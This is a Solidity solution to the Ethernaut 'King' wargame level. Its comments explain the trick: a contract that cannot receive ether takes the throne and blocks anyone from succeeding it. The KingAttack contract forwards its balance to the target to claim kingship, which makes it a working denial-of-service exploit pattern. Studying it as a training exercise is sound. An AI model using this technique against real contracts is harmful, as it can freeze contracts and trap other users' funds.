// # Ethernaut 9: King
// We can keep anyone from becoming king after us by rejecting the transfer of the prize
// money, thereby interrupting execution before `king` is set. This is achieved by making
// a contract king which does not have a payable `fallback` or `receive` function.

pragma solidity ^0.6.0;

contract KingAttack {
    constructor () payable public {}

    // By sending a sufficient amount (`>= prize`) of ether, we become king. Our test
    // queries the `King` instance for the current value of `prize` before deploying this
    // contract with the ether needed.
    function sendEtherTo (address payable target) public {
        target.call.value(address(this).balance)("");
    }
}
